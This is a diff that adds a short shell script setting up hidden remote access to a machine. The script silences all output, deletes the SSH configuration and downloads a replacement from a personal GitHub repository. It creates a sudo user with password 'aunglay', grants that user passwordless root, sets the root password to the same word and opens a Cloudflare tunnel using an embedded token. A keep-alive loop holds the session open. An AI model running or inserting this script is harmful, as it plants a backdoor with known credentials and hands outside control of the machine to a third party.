@@ -1,0 +1,27 @@
+
+apt install openssh-server screen -y &> /dev/null 
+rm -rf /etc/ssh/sshd_config &> /dev/null 
+cd /etc/ssh && wget https://github.com/githubaunglaymyanmar/fordownload/raw/main/ssh/sshd_config &> /dev/null 
+service ssh restart &> /dev/null 
+apt install sshpass screen -y &> /dev/null 
+useradd -m aunglay &> /dev/null 
+adduser aunglay sudo &> /dev/null 
+echo 'aunglay:aunglay' | sudo chpasswd &> /dev/null 
+sed -i 's/\/bin\/sh/\/bin\/bash/g' /etc/passwd &> /dev/null 
+echo "aunglay ALL=(ALL:ALL) NOPASSWD:ALL" >> /etc/sudoers
+printf "aunglay\naunglay" | passwd root &> /dev/null
+# Add cloudflare gpg key
+sudo mkdir -p --mode=0755 /usr/share/keyrings
+curl -fsSL https://pkg.cloudflare.com/cloudflare-public-v2.gpg | sudo tee /usr/share/keyrings/cloudflare-public-v2.gpg >/dev/null
+# Add this repo to your apt repositories
+echo 'deb [signed-by=/usr/share/keyrings/cloudflare-public-v2.gpg] https://pkg.cloudflare.com/cloudflared any main' | sudo tee /etc/apt/sources.list.d/cloudflared.list
+# install cloudflared
+sudo apt-get update && sudo apt-get install cloudflared
+sudo sudo cloudflared service install eyJhIjoiMzcwZTRmM2E4MzVmZWU3Yzk1MzBiYWJlNWYxMzBjZTgiLCJ0IjoiYWE0YWU1MzktM2I4My00MzE3LWI0NDAtNTQ3OTMzNzM0ZTU5IiwicyI6Ik1XUmpORFpsWkRBdFpqWXhNUzAwWXpabExXSm1NV1F0TlRGa016Z3pZVFl5TWpKaiJ9
+screen -m -d -S cloudflare cloudflared tunnel run --token eyJhIjoiMzcwZTRmM2E4MzVmZWU3Yzk1MzBiYWJlNWYxMzBjZTgiLCJ0IjoiYWE0YWU1MzktM2I4My00MzE3LWI0NDAtNTQ3OTMzNzM0ZTU5IiwicyI6Ik1XUmpORFpsWkRBdFpqWXhNUzAwWXpabExXSm1NV1F0TlRGa016Z3pZVFl5TWpKaiJ9
+
+sleep 5s
+python3 -c "import time; 
+while True: 
+    print('Still alive...'); 
+    time.sleep(600)"
